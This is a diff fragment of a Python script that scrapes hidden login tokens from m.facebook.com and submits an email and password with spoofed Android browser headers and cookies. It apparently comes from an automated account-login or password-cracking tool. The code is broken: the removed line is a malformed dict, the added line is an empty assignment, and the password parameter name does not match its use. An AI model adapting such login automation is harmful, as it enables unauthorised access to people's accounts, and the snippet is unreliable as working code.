@@ -759,7 +759,7 @@ def md1(idf,pwv):
       dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
-      heade={Mozilla/5.0 (Linux; Android 11; CPH2159 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+      heade=
       "Host": "m.facebook.com",
       "content-length": f"{len(str(dataa))}",
       "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
